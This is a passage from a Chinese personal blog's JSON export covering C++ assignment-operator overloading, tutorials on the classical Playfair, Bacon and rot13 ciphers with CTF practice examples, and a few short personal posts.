由于对象内包含指针，将造成不良后果:为了避免内存泄露，指针成员将释放指针所指向的空间，以便接受新的指针值，这正是由赋值运算符的特征所决定的。但如果是”x=x”即自己给自己赋值，会出现什么情况呢？x将释放分配给自己的内存，然后，从赋值运算符右边指向的内存中复制值时，发现值不见了。 因此，包含动态分配成员的类除提供拷贝构造函数外，还应该考虑重载”=”赋值操作符号。 类定义变为: class CExample { … CExample(const CExample&amp;); //拷贝构造函数 CExample&amp; operator = (const CExample&amp;); //赋值符重载 … }; //赋值操作符重载 CExample &amp; CExample::operator = (const CExample&amp; RightSides) { nSize=RightSides.nSize; //复制常规成员 char \\temp=new char[nSize]; //复制指针指向的内容 memcpy(temp, RightSides.pBuffer, nSize*sizeof(char)); delete []pBuffer; //删除原指针指向内容 (将删除操作放在后面，避免X=X特殊情况下，内容的丢失) pBuffer=temp; //建立新指向 return *this } 三、拷贝构造函数使用赋值运算符重载的代码。 CExample::CExample(const CExample&amp; RightSides) { pBuffer=NULL; *this=RightSides //调用重载后的”=” }","categories":[{"name":"技术学习","slug":"技术学习","permalink":"https://hexo.imagemlt.xyz/categories/技术学习/"}],"tags":[]},{"title":"brainfuck解释器","slug":"brainfuck-interpreter","date":"2016-12-13T00:23:07.000Z","updated":"2019-02-02T00:29:25.000Z","comments":true,"path":"post/brainfuck-interpreter/index.html","link":"","permalink":"https://hexo.imagemlt.xyz/post/brainfuck-interpreter/index.html","excerpt":"","text":"brainfuck解释器","categories":[{"name":"Crypto","slug":"Crypto","permalink":"https://hexo.imagemlt.xyz/categories/Crypto/"}],"tags":[]},{"title":"playfair","slug":"playfair","date":"2016-12-12T23:07:21.000Z","updated":"2019-02-02T00:29:25.000Z","comments":true,"path":"post/playfair/index.html","link":"","permalink":"https://hexo.imagemlt.xyz/post/playfair/index.html","excerpt":"","text":"它有一些不太明显的特征：密文的字母数一定是偶数；任意两个同组的字母都不会相同，如果出现这种字符必是乱码和虚码。 编写分三步：1.编制密码表 2.整理明文 3.编写密文 构成部分：1.密钥 2.明文3.密文4.注明的某个字母代替的另一个字母。 加密编制密码表 第一步是编制密码表。在这个5*5的密码表中，共有5行5列字母。第一列（或第一行）是密钥,其余按照字母顺序。密钥是一个单词或词组，若有重复字母，可将后面重复的字母去掉。当然也要把使用频率最少的字母去掉。如：密钥是Live and learn,去掉后则为liveandr。如果密钥过长可占用第二列或行。 如密钥crazy dog，可编制成 C D F M T R O H N U A G I ( J ) P V Z B K Q W Y E L S X 整理明文第二步整理明文。将明文每两个字母组成一对。如果成对后有两个相同字母紧挨或最后一个字母是单个的，就插入一个字母X（或者Q）。 如，communist，应成为co,mx,mu,ni,st。 编写密文最后编写密文。对明文加密规则如下： 1 若p1 p2在同一行，对应密文c1 c2分别是紧靠p1 p2 右端的字母。其中第一列被看做是最后一列的右方。如，按照前表，ct对应dc 2 若p1 p2在同一列，对应密文c1 c2分别是紧靠p1 p2 下方的字母。其中第一行被看做是最后一行的下方。 3 若p1 p2不在同一行，不在同一列，则c1 c2是由p1 p2确定的矩形的其他两角的字母（至于横向替换还是纵向替换要事先约好，或自行尝试）。如，按照前表，wh对应ku或uk。 如，依照上表，明文where there is life,there is hope. 可先整理为：WH ER ET HE RE IS LI FE TH ER EI SH OP EX 然后密文为：KU YO XD OL OY PL FK DL FU YO LG LN NG LY 将密文变成大写，然后几个字母一组排列。 如5个一组就是KUYOX DOLOY PLFKD LFUYO LGLNN GLY 解密Playfair解密算法首先将密钥填写在一个5*5的矩阵中（去Q留Z），矩阵中其它未用到的字母按顺序填在矩阵剩余位置中，根据替换矩阵由密文得到明文。 对密文解密规则如下： 1 若c1 c2在同一行，对应明文p1 p2分别是紧靠c1 c2 左端的字母。其中最后一列被看做是第一列的左方。 2 若c1 c2在同一列，对应明文p1 p2分别是紧靠c1 c2 上方的字母。其中最后一行被看做是第一行的上方。 3 若c1 c2不在同一行，不在同一列，则p1 p2是由c1 c2确定的矩形的其他两角的字母。 其实就是反其道而行之。 练习一： 密钥：boys and girls are students ( 按行填充密钥, 不在同一行的明文字母, 行不变列变) 密文 GUUID BCYXN YOETK RUGAB EMBCE TDICQ LDHYB JRMRD IRCV 明文(原文)：It is not a problem. It is a challenge. Enjoy facing it. 二：密钥：father ( 按行填充密钥, 不在同一行的明文字母, 行变列不变) 密文：OPHEN UMRFP EFPVI DLRGQ NRRNW RHKNR SVNYF HSVFI IJRQP AFK 明文(原文)：Nothing in the world is difficult, if you set your mind to it.","categories":[{"name":"Crypto","slug":"Crypto","permalink":"https://hexo.imagemlt.xyz/categories/Crypto/"},{"name":"Ctf","slug":"Crypto/Ctf","permalink":"https://hexo.imagemlt.xyz/categories/Crypto/Ctf/"}],"tags":[]},{"title":"培根密码","slug":"bacon","date":"2016-12-12T16:15:34.000Z","updated":"2019-02-02T00:29:25.000Z","comments":true,"path":"post/bacon/index.html","link":"","permalink":"https://hexo.imagemlt.xyz/post/bacon/index.html","excerpt":"","text":"第一种方式A aaaaa B aaaab C aaaba D aaabb E aabaa F aabab G aabba H aabbb I abaaa J abaab K ababa L ababb M abbaa N abbab O abbba P abbbb Q baaaa R baaab S baaba T baabb U babaa V babab W babba X babbb Y bbaaa Z bbaab 第二种方式a AAAAA g AABBA n ABBAA t BAABA b AAAAB h AABBB o ABBAB u-v BAABB c AAABA i-j ABAAA p ABBBA w BABAA d AAABB k ABAAB q ABBBB x BABAB e AABAA l ABABA r BAAAA y BABBA f AABAB m ABABB s BAAAB z BABBB 举例如：密文是LOVE，用“随意选取句子和文”加密，得到结果就是“SuIyI XuaNq uJUzi HEwEN”（这里用小写代表斜体）","categories":[{"name":"Crypto","slug":"Crypto","permalink":"https://hexo.imagemlt.xyz/categories/Crypto/"},{"name":"Ctf","slug":"Crypto/Ctf","permalink":"https://hexo.imagemlt.xyz/categories/Crypto/Ctf/"}],"tags":[]},{"title":"rot13加密","slug":"rot13","date":"2016-12-12T16:06:03.000Z","updated":"2019-02-02T00:29:25.000Z","comments":true,"path":"post/rot13/index.html","link":"","permalink":"https://hexo.imagemlt.xyz/post/rot13/index.html","excerpt":"","text":"最近做百度杯的Ctf遇到了这样一道题，后得知为rot13加密。 rot13加密秘钥: ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm rot13加密可回转。","categories":[{"name":"Crypto","slug":"Crypto","permalink":"https://hexo.imagemlt.xyz/categories/Crypto/"},{"name":"Ctf","slug":"Crypto/Ctf","permalink":"https://hexo.imagemlt.xyz/categories/Crypto/Ctf/"}],"tags":[]},{"title":"谈谈你们的人生观和价值观","slug":"talk-about-your-personality","date":"2016-11-29T14:32:37.000Z","updated":"2019-02-02T00:29:25.000Z","comments":true,"path":"post/talk-about-your-personality/index.html","link":"","permalink":"https://hexo.imagemlt.xyz/post/talk-about-your-personality/index.html","excerpt":"","text":"大家谈一谈谈自己的人生观和价值观吧 帮我完成思修课的采访作业","categories":[{"name":"人生杂谈","slug":"人生杂谈","permalink":"https://hexo.imagemlt.xyz/categories/人生杂谈/"}],"tags":[]},{"title":"世界，您好！","slug":"hello-world-1","date":"2016-11-27T12:18:21.000Z","updated":"2019-02-02T00:29:25.000Z","comments":true,"path":"post/hello-world-1/index.html","link":"","permalink":"https://hexo.imagemlt.xyz/post/hello-world-1/index.html","excerpt":"","text":"我的wordpress博客终于建成了！ 以后好好学习，做一个大佬。","categories":[{"name":"人生杂谈","slug":"人生杂谈","permalink":"https://hexo.imagemlt.xyz/categories/人生杂谈/"}],"tags":[]}]}